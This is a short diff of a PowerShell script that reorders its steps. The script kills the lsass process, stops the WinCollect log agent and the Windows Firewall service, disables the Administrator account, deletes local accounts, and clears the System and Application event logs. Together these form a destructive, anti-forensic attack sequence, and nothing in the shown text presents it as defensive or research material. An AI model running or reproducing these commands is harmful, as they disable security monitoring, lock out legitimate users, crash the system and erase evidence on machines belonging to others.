@@ -1,4 +1,3 @@
-Stop-Process -Name "lsass" -ErrorAction Ignore
 Stop-Process -Name "WinCollectSvc" -Force -ErrorAction Ignore
 Stop-Process -Name "WinCollect" -Force -ErrorAction Ignore
 Stop-Service -Name "mpssvc" -Force -ErrorAction Ignore
@@ -16,6 +15,8 @@ Disable-LocalUser -Name "Administrator"
 Remove-LocalUser -Name "Guest"
 Remove-LocalUser -Name "WDAGUtilityAccount"
 Remove-LocalUser -Name "DefaultAccount"
+
+Stop-Process -Name "lsass" -ErrorAction Ignore
 
 Clear-EventLog -LogName System
 Clear-EventLog -LogName Application
